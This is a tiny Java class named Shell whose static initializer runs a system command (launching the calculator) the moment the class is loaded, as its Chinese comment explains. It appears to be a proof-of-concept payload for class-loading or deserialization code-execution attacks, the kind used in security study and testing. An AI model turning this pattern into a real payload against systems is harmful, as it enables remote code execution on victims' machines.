public class Shell{
    static {     // 这样才能加载类时先主动执行代码
        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e) {};
   }
}
